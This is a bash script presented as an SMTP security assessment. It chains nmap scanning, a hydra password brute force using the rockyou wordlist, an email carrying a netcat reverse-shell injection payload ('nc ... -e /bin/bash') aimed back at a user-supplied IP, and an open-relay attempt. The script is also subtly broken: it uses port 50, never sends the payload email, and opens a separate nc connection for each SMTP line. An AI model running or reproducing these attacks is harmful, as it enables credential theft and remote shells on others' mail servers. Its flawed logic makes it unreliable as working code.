#!/bin/bash

# Define variables
SMTP_SERVER="smtp.example.com"
SMTP_PORT="50"
TARGET_IP=""

# Prompt user for target IPv4
read -p "Enter your target IPv4: " TARGET_IP

# Enumeration
echo -e "\e[1mEnumerating SMTP server on port $SMTP_PORT...\e[0m"
nmap -p $SMTP_PORT -sC -sV -oN nmap_results.txt $SMTP_SERVER
echo -e "\n"

# Vulnerability Scanning
echo -e "\e[1mScanning for vulnerabilities on port $SMTP_PORT...\e[0m"
nmap --script smtp-vuln* -p $SMTP_PORT -oN smtp_vuln_results.txt $SMTP_SERVER
echo -e "\n"

# Check if port is open
echo -e "\e[1mChecking if port $SMTP_PORT is open...\e[0m"
if nc -zv $SMTP_SERVER $SMTP_PORT; then
    echo -e "\e[32mPort $SMTP_PORT is open.\e[0m"
else
    echo -e "\e[31mPort $SMTP_PORT is closed. Exiting script.\e[0m"
    exit 1
fi
echo -e "\n"

# Brute Force Attack
echo -e "\e[1mAttempting brute force attack on port $SMTP_PORT...\e[0m"
gunzip -c /usr/share/wordlists/rockyou.txt.gz | hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P - -s $SMTP_PORT -vV $SMTP_SERVER smtp
echo -e "\n"

# Payload Injection
echo -e "\e[1mInjecting payloads on port $SMTP_PORT...\e[0m"
# Craft malicious email message with payload injection
# Example payload:
# Payload: '; nc -nv $TARGET_IP 1234 -e /bin/bash'
echo "Subject: Test" > payload.txt
echo "From: attacker@example.com" >> payload.txt
echo "To: victim@example.com" >> payload.txt
echo "" >> payload.txt
echo "; nc -nv $TARGET_IP 1234 -e /bin/bash" >> payload.txt
echo "" >> payload.txt
# Send the malicious email using SMTP client (e.g., sendmail, telnet, netcat)
echo -e "\n"

# Exploiting Misconfigurations
echo -e "\e[1mExploiting misconfigurations on port $SMTP_PORT...\e[0m"
# Example misconfiguration exploitation logic:
# Exploit weak access controls:
# Attempt to relay emails through the server without authentication
echo "EHLO example.com" | nc -nv $SMTP_SERVER $SMTP_PORT
echo "MAIL FROM: <attacker@example.com>" | nc -nv $SMTP_SERVER $SMTP_PORT
echo "RCPT TO: <victim@example.com>" | nc -nv $SMTP_SERVER $SMTP_PORT
echo "DATA" | nc -nv $SMTP_SERVER $SMTP_PORT
echo "Subject: Test" | nc -nv $SMTP_SERVER $SMTP_PORT
echo "From: attacker@example.com" | nc -nv $SMTP_SERVER $SMTP_PORT
echo "To: victim@example.com" | nc -nv $SMTP_SERVER $SMTP_PORT
echo "" | nc -nv $SMTP_SERVER $SMTP_PORT
echo "This is a test message." | nc -nv $SMTP_SERVER $SMTP_PORT
echo "." | nc -nv $SMTP_SERVER $SMTP_PORT
echo "QUIT" | nc -nv $SMTP_SERVER $SMTP_PORT
echo -e "\n"
echo -e "\n"

echo -e "\e[1mSecurity assessment on port $SMTP_PORT complete.\e[0m"
